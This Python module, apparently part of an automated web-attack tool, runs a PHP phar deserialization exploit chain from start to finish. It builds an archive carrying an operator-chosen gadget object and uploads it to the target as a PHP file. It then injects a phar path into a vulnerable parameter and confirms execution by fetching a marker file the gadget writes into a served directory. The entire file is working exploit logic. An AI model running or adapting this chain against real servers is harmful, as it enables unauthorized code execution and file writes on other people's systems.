"""Getting an archive's metadata deserialized, and proving it happened.

The phar chain in full, and every step of it is a thing that can fail on its own:

1. **A call site.** PHP 8 does not deserialize a metadata blob when something
   reads inside an archive - only when the application asks for it. So the target
   has to have a place that opens an archive it was pointed at, and `probe_archive`
   looks for one by the error PHP produces when a non-archive reaches `new Phar`.
2. **An archive on the target.** Built here rather than handed over, because the
   gadget needs a marker and a path that are fresh for this run; uploaded through
   the endpoint the operator names, when they name one.
3. **A gadget.** The class and its properties come from the command line, because
   they come from the target's own code - the one part that cannot be worked out
   from out here.
4. **A side effect.** The gadget is aimed at a file name under a directory the
   application serves, so the proof of execution is a request that returns a
   string this run invented.

The chain is honest about which of those it got. A run that found a call site but
no way to put an archive on the target says so; one that uploaded an archive into
a directory nobody serves says the write landed and nothing could be read back.
"""

from __future__ import annotations

import secrets
from dataclasses import dataclass
from urllib.parse import urljoin

from ...core import phar
from ...core.httpmsg import Request
from ...engine.bypass import Confidence
from ...engine.inject import inject
from ...engine.sideeffect import make_marker, probe_side_effect, was_there_before
from ...engine.upload import reachable_url, upload
from ...engine.webroot import roots_for_run

SINK = "proto.archive.sink"
PHAR_RAN = "proto.phar.executed"


@dataclass
class Gadget:
    """The class to build, and the properties to give it."""

    class_name: str = ""
    properties: dict[str, str] = None  # type: ignore[assignment]

    def __post_init__(self) -> None:
        if self.properties is None:
            self.properties = {}

    @property
    def usable(self) -> bool:
        return bool(self.class_name)


def _fill(value: str, fields: dict[str, str]) -> str:
    """Substitute the placeholders a gadget's properties are written with.

    `{file}` is the path the gadget is asked to write, `{marker}` is what it is
    asked to write there, and `{url}` is where that file will be served from.
    The operator knows which property holds a path; the tool knows what a fresh
    path and a fresh marker are, and this is where the two meet.
    """
    out = value
    for name, replacement in fields.items():
        out = out.replace("{" + name + "}", replacement)
    return out


def build_archive(gadget: Gadget, fields: dict[str, str]) -> bytes:
    """The archive, with its metadata built from the gadget and the substitutions."""
    properties = {name: _fill(value, fields) for name, value in gadget.properties.items()}
    metadata = phar.php_object(gadget.class_name, properties)
    return phar.build(files=[("index.php", b"<?php echo 1;")], metadata=metadata)


def write_targets(roots, upload_dir: str) -> list[str]:
    """The directories the gadget might write into, and how each is served.

    Two things have to be true at once: the directory has to be writable by the
    user the application runs as, and it has to be one the web server serves. The
    web root itself is often neither writable nor - on a stock install - owned by
    that user, while an upload directory usually is, because accepting files is
    what it is for.

    So the upload directory is tried first, under each candidate root, and the
    root itself after. Candidates run deepest-first because the roots are ordered
    by how much they are believed.

    A relative path is not in the list, and that is a measured decision rather
    than a preference: PHP resolves a relative path against the working directory
    of the process, and a web request's is not reliably the directory it serves
    from. A gadget asked for a relative path wrote into the filesystem root,
    where nothing is served - and on a locked-down worker, into nothing at all.
    """
    out: list[str] = []
    seen: set[str] = set()
    for root in roots:
        base = root.path.rstrip("/")
        for directory in ([upload_dir.strip("/")] if upload_dir else []) + [""]:
            written = f"{base}/{directory}/" if directory else f"{base}/"
            if written not in seen:
                seen.add(written)
                out.append(written)
    return out


def served_at(directory: str, root: str, name: str) -> str:
    """The URL a file written into `directory` under `root` is served from."""
    relative = directory[len(root):].strip("/")
    return f"/{relative}/{name}" if relative else f"/{name}"


def directory_of(landed: str) -> str:
    """The directory part of a path the target gave, when it gave a relative one.

    An upload endpoint that answers `uploads/x.phar` has just said which
    directory it writes into, and that directory is by definition writable and -
    since the archive is meant to be fetched - served. It is the best place to
    ask a gadget to write, and the target volunteered it.
    """
    landed = (landed or "").strip()
    if not landed or landed.startswith("/") or "/" not in landed:
        return ""
    return landed.rsplit("/", 1)[0].strip("/")


def exploit_phar(ctx) -> None:
    """Run the chain: find the call site, put an archive there, read the result."""
    gadget = Gadget(
        class_name=ctx.config.get("phar_class") or "",
        properties=dict(ctx.config.get("phar_set") or {}),
    )
    if not gadget.usable:
        ctx.blackboard.mark_not_covered(
            "exploit.phar",
            "no gadget was given; pass --phar-class with the class the target's code autoloads",
        )
        return

    sink = ctx.blackboard.get(SINK)
    if not sink:
        ctx.blackboard.mark_not_covered(
            "exploit.phar",
            "no parameter on this target was found opening archives, so there is nothing to "
            "point an archive at",
        )
        return

    base = _base_of(ctx)
    roots = roots_for_run(ctx.blackboard, operator_said=ctx.config.get("webroot") or "")
    if not roots.guesses:
        ctx.blackboard.mark_not_covered(
            "exploit.phar", "no directory was established that the application could write into"
        )
        return
    ctx.info(f"   {roots.describe()}")

    root_paths = [guess.path for guess in roots.guesses]
    param = _param_for(ctx, sink)
    archive_dir = ctx.config.get("archive_dir") or ""

    # One candidate at a time, stopping at the first that serves the file back.
    # Each costs an archive, an upload and a trigger, which is why the list is
    # ordered by how much each entry is believed and why it is short.
    #
    # The list grows once: the first upload says which directory an upload lands
    # in, and that directory is the best place to write - it is writable by
    # definition and it is where the archive itself is already being served from.
    tried: list[str] = []
    targets = write_targets(roots.guesses, archive_dir)
    index = 0
    while index < len(targets):
        directory = targets[index]
        index += 1
        if ctx.stopped:
            return
        root = next((r for r in root_paths if directory.startswith(r.rstrip("/") + "/")), "")
        if not root:
            continue
        name = f"ik{secrets.token_hex(6)}.txt"
        written = directory + name
        served = urljoin(base.rstrip("/") + "/", served_at(directory, root, name).lstrip("/"))
        marker = make_marker()

        archive = build_archive(gadget, {"file": written, "marker": marker, "url": served})
        landed = _place_archive(ctx, archive, base)
        if landed is None:
            return
        archive_path, how = landed

        # The first upload volunteers the directory uploads land in. Anything
        # asking the gadget to write is better off there than in the web root,
        # which is usually owned by someone else - so those candidates go next,
        # not at the end of a list that may be a dozen roots long.
        if not archive_dir:
            learned = directory_of(archive_path)
            if learned:
                archive_dir = learned
                extra = [t for t in write_targets(roots.guesses, archive_dir) if t not in targets]
                targets[index:index] = extra
                ctx.info(
                    f"   uploads land in {learned}/, which is writable and served; "
                    "trying that next"
                )

        if was_there_before(ctx, served):
            tried.append(f"{written}: already served something")
            continue

        inject(ctx, param, archive_path, "exploit.phar.trigger")
        ctx.info(f"   asked the gadget to write {written}; archive {how}")

        effect = probe_side_effect(ctx, served, marker)
        if effect.proved:
            _report_ran(ctx, gadget, sink, archive_path, effect)
            return
        tried.append(f"{written}: {effect.describe()}")

    ctx.emit(f"  [!] the gadget did not run anywhere it was asked to write ({len(tried)} tried)")
    ctx.blackboard.set(
        "proto.phar.no-effect",
        "the archive was opened but no file it was asked to write was served",
        evidence="; ".join(tried)[:400],
        confidence=Confidence.LIKELY,
    )


def _report_ran(ctx, gadget, sink: str, archive_path: str, effect) -> None:
    """A gadget that ran, recorded as a finding and on the board."""
    ctx.emit(f"  [+] {effect.describe()}")
    ctx.blackboard.set(
        PHAR_RAN,
        True,
        evidence=effect.describe(),
        confidence=Confidence.CONFIRMED,
    )
    ctx.blackboard.add(
        "proto.findings",
        {
            "name": f"phar://{gadget.class_name}",
            "param": sink,
            "payload": archive_path,
            "generation": 0,
            "request": "",
            "evidence": effect.describe(),
            "family": "deserialization",
            "wrapper_note": "the metadata was built with the gadget and the target asked for it",
        },
    )


def _base_of(ctx) -> str:
    from urllib.parse import urlsplit

    return f"{urlsplit(ctx.config['request'].url).scheme}://{urlsplit(ctx.config['request'].url).netloc}"


def _param_for(ctx, key: str):
    """The parameter the finding named, looked up among this run's candidates."""
    from .graph import _candidates

    for param in _candidates(ctx):
        if param.key() == key:
            return param
    raise LookupError(key)


def _place_archive(ctx, archive: bytes, base: str) -> tuple[str, str] | None:
    """Put the archive on the target, by uploading it or by being told where it is.

    Uploading closes the loop; being told is the fallback for a target whose
    upload path is not a form the tool can reach. The path is returned with a
    phrase saying which of the two happened, because the operator needs to know
    whether a failure was the archive or the assumption about where it went.
    """
    upload_to = ctx.config.get("upload_to") or ""
    if upload_to:
        name = f"ik{secrets.token_hex(6)}.phar"
        landed = upload(
            ctx,
            upload_to,
            archive,
            name,
            field=ctx.config.get("upload_field") or "file",
            content_type="application/x-php",
        )
        if not landed.landed:
            ctx.emit("  [-] the upload endpoint did not accept the archive")
            ctx.blackboard.mark_dead_end("exploit.phar", "the upload was refused")
            return None
        ctx.info(f"   uploaded as {name}; {landed.describe()}")
        return landed.path, "uploaded"

    given = ctx.config.get("upload") or ""
    if given:
        # A path the operator gives may be the file or the directory it is in.
        if given.endswith("/"):
            name = f"ik{secrets.token_hex(6)}.phar"
            return f"{given.rstrip('/')}/{name}", "named by the operator"
        return given, "named by the operator"

    ctx.blackboard.mark_not_covered(
        "exploit.phar",
        "there is no archive on the target to point at: pass --upload-to with the upload "
        "endpoint, or --upload with the path an archive already occupies",
    )
    return None
